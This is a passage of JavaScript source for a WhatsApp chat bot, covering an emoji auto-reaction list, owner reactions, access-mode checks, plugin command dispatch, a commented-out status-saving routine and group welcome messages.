"🇺🇸", "🇬🇧", "🇨🇦", "🇦🇺", "🇯🇵", "🇫🇷", "🇪🇸", '👍', '👎', '👏', '👫', '👭', '👬', '👮', '🤝', '🙏', '👑', '🌻', '🌺', '🌸', '🌹', '🌴', "🏞️", '🌊', '🚗', '🚌', "🛣️", "🛫️", "🛬️", '🚣', '🛥', '🚂', '🚁', '🚀', "🏃‍♂️", "🏋️‍♀️", "🏊‍♂️", "🏄‍♂️", '🎾', '🏀', '🏈', '🎯', '🏆', '??', '⬆️', '⬇️', '⇒', '⇐', '↩️', '↪️', 'ℹ️', '‼️', '⁉️', '‽️', '©️', '®️', '™️', '🔴', '🔵', '🟢', '🔹', '🔺', '💯', '👑', '🤣', "🤷‍♂️", "🤷‍♀️", "🙅‍♂️", "🙅‍♀️", "🙆‍♂️", "🙆‍♀️", "🤦‍♂️", "🤦‍♀️", '🏻', '💆‍♂️', "💆‍♀️", "🕴‍♂️", "🕴‍♀️", "💇‍♂️", "💇‍♀️", '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '�', '🏯', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🌳', '🌲', '🌾', '🌿', '🍃', '🍂', '🍃', '🌻', '💐', '🌹', '🌺', '🌸', '🌴', '🏵', '🎀', '🏆', '🏈', '🏉', '🎯', '🏀', '🏊', '🏋', '🏌', '🎲', '📚', '📖', '📜', '📝', '💭', '💬', '🗣', '💫', '🌟', '🌠', '🎉', '🎊', '👏', '💥', '🔥', '💥', '🌪', '💨', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌱', '🌿', '🍃', '🍂', '🌻', '💐', '🌹', '🌺', '🌸', '🌴', '🏵', '🎀', '🏆', '🏈', '🏉', '🎯', '🏀', '🏊', '🏋', '🏌', '🎲', '📚', '📖', '📜', '📝', '💭', '💬', '🗣', '💫', '🌟', '🌠', '🎉', '🎊', '👏', '💥', '🔥', '💥', '🌪', '💨', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🐒', '🦍', '🦧', '🐶', '🐕', '🦮', "🐕‍🦺", '🐩', '🐺', '🦊', '🦝', '🐱', '🐈', "🐈‍⬛", '🦁', '🐯', '🐅', '🐆', '🐴', '🐎', '🦄', '🦓', '🦌', '🦬', '🐮', '🐂', '🐃', '🐄', '🐷', '🐖', '🐗', '🐽', '🐏', '🐑', '🐐', '🐪', '🐫', '🦙', '🦒', '🐘', '🦣', '🦏', '🦛', '🐭', '🐁', '🐀', '🐹', '🐰', '🐇', "🐿️", '🦫', '🦔', '🦇', '🐻', "🐻‍❄️", '🐨', '🐼', '🦥', '🦦', '🦨', '🦘', '🦡', '🐾', '🦃', '🐔', '🐓', '🐣', '🐤', '🐥', '🐦', '🐧', "🕊️", '🦅', '🦆', '🦢', '🦉', '🦤', '🪶', '🦩', '🦚', '🦜', '🐸', '🐊', '🐢', '🦎', '🐍', '🐲', '🐉', '🦕', '🦖', '🐳', '🐋', '🐬', '🦭', '🐟', '🐠', '😀', '😃', '😄', '😁', '😆', '😅', '🤣', '😂', '🙂', '🙃', '😉', '😊', '😇', '🥰', '😍', '🤩', '😘', '😗', '☺️', '😚', '😙', '🥲', '😋', '😛', '😜', '🤪', '😝', '🤑', '🤗', '🤭', '🤫', '🤔', '🤐', '🤨', '😐', '😑', '😶', "😶‍🌫️", '😏', '😒', '🙄', '😬', "😮‍💨", '🤥', '😌', '😔', '😪', '🤤', '😴', '😷', '🤒', '🤕', '🤢', '🤮', '🤧', '🥵', '🥶', '🥴', '😵', "😵‍💫", '🤯', '🤠', '🥳', '🥸', '😎', '🤓', '🧐', '😕', '😟', '🙁', '☹️', '😮', '😯', '😲', '😳', '🥺', '😦', '😧', '😨', '😰', '😥', '😢', '😭', '😱', '😖', '😣', '😞', '😓', '😩', '😫', '🥱', '😤', '😡', '😠', '🤬', '😈', '👿', '💀', '☠️', '💩', '🤡', '👹', '👺', '👻', '👽', '👾', '🤖', '😺', '😸', '😹', '😻', '😼', '😽', '🙀', '😿', '😾', '🙈', '🙉', '🙊', '💋', '💌', '💘', '💝', '💖', '💗', '💓', '💞', '💕', '💟', '❣️', '💔', "❤️‍🔥", "❤️‍🩹", '❤️', '🧡', '💛', '💚', '💙', '💜', '🤎', '🖤', '🤍', '💯', '💢', '💥', '💫', '💦', '💨', "🕳️", '💣', '💬', "👁️‍🗨️", "🗨️", "🗯️", '💭', '💤', '👋', '🤚', "🖐️", '✋', '🖖', '👌', '🤌', '🤏', '✌️', '🤞', '🤟', '🤘', '🤙', '👈', '👉', '👆', '🖕', '👇', '☝️', '👍', '👎', '✊', '👊', '🤛', '🤜', '👏', '🙌', '👐', '🤲', '🤝', '🙏', '✍️', '💅', '🤳', '💪', '🦾', '🦿', '🦵', '🦶', '👂', '🦻', '👃', '🧠', '🫀', '🫁', '🦷', '🦴', '👀', "👁️", '👅', '👄', '👶', '🧒', '👦', '👧', '🧑', '👱', '👨', '🧔', "🧔‍♂️", "🧔‍♀️", "👨‍🦰", "👨‍🦱", "👨‍🦳", "👨‍🦲", '👩', "👩‍🦰", "🧑‍🦰", "👩‍🦱", "🧑‍🦱", "👩‍🦳", "🧑‍🦳", "👩‍🦲", "🧑‍🦲", "👱‍♀️", "👱‍♂️", '🧓', '👴', '👵', '🙍', "🙍‍♂️", "🙍‍♀️", '🙎', "🙎‍♂️", "🙎‍♀️", '🙅', "🙅‍♂️", "🙅‍♀️", '🙆', "🙆‍♂️", "🙆‍♀️", '💁', "💁‍♂️", "💁‍♀️", '🙋', "🙋‍♂️", "🙋‍♀️", '🧏', "🧏‍♂️", "🧏‍♀️", '🙇', "🙇‍♂️", "🙇‍♀️", '🤦', "🤦‍♂️", "🤦‍♀️", '🤷', "🤷‍♂️", "🤷‍♀️", "🧑‍⚕️", "👨‍⚕️", "👩‍⚕️", "🧑‍🎓", "👨‍🎓", "👩‍🎓", "🧑‍🏫", '👨‍🏫', "👩‍🏫", "🧑‍⚖️", "👨‍⚖️", "👩‍⚖️", "🧑‍🌾", "👨‍🌾", "👩‍🌾", "🧑‍🍳", "👨‍🍳", "👩‍🍳", "🧑‍🔧", "👨‍🔧", "👩‍🔧", "🧑‍🏭", "👨‍🏭", "👩‍🏭", "🧑‍💼", "👨‍💼", "👩‍💼", "🧑‍🔬", "👨‍🔬", "👩‍🔬", "🧑‍💻", "👨‍💻", "👩‍💻", "🧑‍🎤", "👨‍🎤", "👩‍🎤", "🧑‍🎨", "👨‍🎨", "👩‍🎨", "🧑‍✈️", "👨‍✈️", "👩‍✈️", "🧑‍🚀", "👨‍🚀", "👩‍🚀", "🧑‍🚒", "👨‍🚒", "👩‍🚒", '👮', "👮‍♂️", "👮‍♀️", "🕵️", "🕵️‍♂️", "🕵️‍♀️", '💂', "💂‍♂️", "💂‍♀️", '🥷', '👷', "👷‍♂️", "👷‍♀️", '🤴', '👸', '👳', "👳‍♂️", "👳‍♀️", '👲', '🧕', '🤵', "🤵‍♂️", "🤵‍♀️", '👰', "👰‍♂️", "👰‍♀️", '🤰', '🤱', "👩‍🍼", "👨‍🍼", "🧑‍🍼", '👼', '🎅', '🤶', "🧑‍🎄", '🦸', "🦸‍♂️", "🦸‍♀️", '🦹', "🦹‍♂️", "🦹‍♀️", '🧙', "🧙‍♂️", "🧙‍♀️", '🧚', "🧚‍♂️", "🧚‍♀️", '🧛', "🧛‍♂️", "🧛‍♀️", '🧜', "🧜‍♂️", "🧜‍♀️", '🧝', "🧝‍♂️", "🧝‍♀️", '🧞', "🧞‍♂️", "🧞‍♀️", '🧟', "🧟‍♂️", "🧟‍♀️", '💆', "💆‍♂️", "💆‍♀️", '💇', "💇‍♂️", "💇‍♀️", '🚶', "🚶‍♂️", "🚶‍♀️", '🧍', "🧍‍♂️", "🧍‍♀️", '🧎', "🧎‍♂️", "🧎‍♀️", "🧑‍🦯", "👨‍🦯", "👩‍🦯", "🧑‍🦼", "👨‍🦼", "👩‍🦼", "🧑‍🦽", "👨‍🦽", "👩‍🦽", '🏃', "🏃‍♂️", "🏃‍♀️", '💃', '🕺', "🕴️", '👯', "👯‍♂️", "👯‍♀️", '🧖', "🧖‍♂️", "🧖‍♀️", '🧗', "🧗‍♂️", "🧗‍♀️", '🤺', '🏇', '⛷️', '🏂', "🏌️", "🏌️‍♂️", "🏌️‍♀️", '🏄', "🏄‍♂️", "🏄‍♀️", '🚣', "🚣‍♂️", "🚣‍♀️", '🏊', "🏊‍♂️", "🏊‍♀️", '⛹️', "⛹️‍♂️", "⛹️‍♀️", "🏋️", "🏋️‍♂️", "🏋️‍♀️", '🚴', "🚴‍♂️", '🚴‍♀️', '🚵', "🚵‍♂️", "🚵‍♀️", '🤸', "🤸‍♂️", "🤸‍♀️", '🤼', "🤼‍♂️", "🤼‍♀️", '🤽', "🤽‍♂️", "🤽‍♀️", '🤾', "🤾‍♂️", "🤾‍♀️", '🤹', "🤹‍♂️", "🤹‍♀️", '🧘', "🧘‍♂️", "🧘‍♀️", '🛀', '🛌', "🧑‍🤝‍🧑", '👭', '👫', '👬', '💏', "👩‍❤️‍💋‍👨", "👨‍❤️‍💋‍👨", "👩‍❤️‍💋‍👩", '💑', "👩‍❤️‍👨", "👨‍❤️‍👨", "👩‍❤️‍👩", '👪', "👨‍👩‍👦", "👨‍👩‍👧", "👨‍👩‍👧‍👦", "👨‍👩‍👦‍👦", "👨‍👩‍👧‍👧", "👨‍👨‍👦", '👨‍👨‍👧', "👨‍👨‍👧‍👦", "👨‍👨‍👦‍👦", "👨‍👨‍👧‍👧", "👩‍👩‍👦", "👩‍👩‍👧", "👩‍👩‍👧‍👦", "👩‍👩‍👦‍👦", "👩‍👩‍👧‍👧", "👨‍👦", "👨‍👦‍👦", "👨‍👧", "👨‍👧‍👦", "👨‍👧‍👧", "👩‍👦", "👩‍👦‍👦", "👩‍👧", "👩‍👧‍👦", "👩‍👧‍👧", "🗣️", '👤', '👥', '🫂', '👣', '🦰', '🦱', '🦳', '🦲', '🐵'];

        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]; // 
        m.react(randomReaction);
    }
}
*/

//------------------ Owner react ---------------------//

        if (config.OWNER_REACT === "true") {
            if (senderNumber.includes(94743491027)) {
                if (isReact) return;
                m.react("🐉");
            }
        }
        

//------------------ Work tipe ---------------------//


        if (!isOwner && config.MODE === "private") return;
        if (!isOwner && isGroup && config.MODE === "inbox") return;
        if (!isOwner && !isGroup && config.MODE === "groups") return;

//------------------ Auto read cmd ---------------------//

if (isCmd && config.AUTO_READ_CMD === "true") {
    await conn.readMessages([mek.key]) 
}

//------------------ Auto tipping ---------------------//

if (isCmd && config.AUTO_TIPPING === "true") {
    await conn.sendPresenceUpdate('composing', from)
}

//------------------------------------------------------//

        const events = require('./command');
        const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;

        if (isCmd) {
            const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName));
            if (cmd) {
                if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } });
                try {
                    cmd.function(conn, mek, m, { from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
                } catch (e) {
                    console.error("[PLUGIN ERROR] " + e);
                }
            }
        }
             
        events.commands.map(async(command) => {
            if (body && command.on === "body") {
            command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
            } else if (mek.q && command.on === "text") {
            command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
            } else if (
            (command.on === "image" || command.on === "photo") &&
            mek.type === "imageMessage"
            ) {
            command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
            } else if (
            command.on === "sticker" &&
            mek.type === "stickerMessage"
            ) {
            command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
            }});

    });
    
    conn.decodeJid = (jid) => {
        if (!jid) return jid;
        if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {};
            return decode.user && decode.server && decode.user + '@' + decode.server || jid;
        } else return jid;
    };

//------------------ Status save ---------------------//

  /*  
if(body === "send" || body === "Send" || body === "Seve" || body === "Ewpm" || body === "ewpn" || body === "Dapan" || body === "dapan" || body === "oni" || body === "Oni" || body === "save" || body === "Save" || body === "ewanna" || body === "Ewanna" || body === "ewam" || body === "Ewam" || body === "sv" || body === "Sv"|| body === "දාන්න"|| body === "එවම්න"){
    // if(!m.quoted) return reply("*Please Mention status*")
    const data = JSON.stringify(mek.message, null, 2);
    const jsonData = JSON.parse(data);
    const isStatus = jsonData.extendedTextMessage.contextInfo.remoteJid;
    if(!isStatus) return

    const getExtension = (buffer) => {
        const magicNumbers = {
            jpg: 'ffd8ffe0',
            png: '89504e47',
            mp4: '00000018',
        };
        const magic = buffer.toString('hex', 0, 4);
        return Object.keys(magicNumbers).find(key => magicNumbers[key] === magic);
    };

    if(m.quoted.type === 'imageMessage') {
        var nameJpg = getRandom('');
        let buff = await m.quoted.download(nameJpg);
        let ext = getExtension(buff);
        await fs.promises.writeFile("./" + ext, buff);
        const caption = m.quoted.imageMessage.caption;
        await conn.sendMessage(from, { image: fs.readFileSync("./" + ext), caption: caption });
    } else if(m.quoted.type === 'videoMessage') {
        var nameJpg = getRandom('');
        let buff = await m.quoted.download(nameJpg);
        let ext = getExtension(buff);
        await fs.promises.writeFile("./" + ext, buff);
        const caption = m.quoted.videoMessage.caption;
        let buttonMessage = {
            video: fs.readFileSync("./" + ext),
            mimetype: "video/mp4",
            fileName: `${m.id}.mp4`,
            caption: "*ᴍᴜʟᴛɪ ᴅᴇᴠɪᴄᴇ ᴡᴀ ʙᴏᴛ ʙʏ Qᴜᴇᴇɴ ɴᴇᴛʜᴜ ᴍᴅ*> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ - ɴᴇᴛʜᴜ ᴍᴀx ʏᴛ*" ,
            headerType: 4
        };
        await conn.sendMessage(from, buttonMessage,{
            quoted: mek
        });
    }
}
*/
    
//------------------ Welcome ---------------------//

    if (config.WELCOME === "true") {
        conn.ev.on('group-participants.update', async (anu) => {
            const metadata = await conn.groupMetadata(anu.id);
            const participants = anu.participants;
            for (let num of participants) {
                let ppuser;
                try {
                    ppuser = await conn.profilePictureUrl(num, 'image');
                } catch {
                    ppuser = 'https://pomf2.lain.la/f/hxp64475.jpg';
                }
    
                if (anu.action == 'add') {
                    conn.sendMessage(anu.id, { text: `Hi @${num.split("@")[0]}, Welcome to ${metadata.subject}\nFeel Free To Introduce Your Self To The Group\n\n*© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴄʏʙᴇʀ ꜰʀᴏʟʏ*`, contextInfo: { mentionedJid: [num] } });
                } else if (anu.action == 'remove') {
                    conn.sendMessage(anu.id, { text: `Goodbye @${num.split("@")[0]}!\nSee You Next Time\n\n*© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴄʏʙᴇʀ ꜰʀᴏʟʏ*`, contextInfo: { mentionedJid: [num] } });
                }
            }
        });
    }
}

//---------------------------------------------------//

connectToWA(); 

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
